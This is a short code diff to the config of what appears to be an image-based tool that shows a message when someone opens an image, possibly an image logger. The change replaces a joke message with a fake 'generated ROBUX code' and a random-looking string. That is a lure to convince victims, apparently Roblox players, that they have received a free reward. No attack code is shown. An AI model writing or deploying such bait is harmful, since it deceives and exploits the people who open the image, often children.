@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Do u want a dancing cat? dm me.", # Message to show
+        "message": "Your generated ROBUX code is: H5lsZm7Kepnwhu8", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
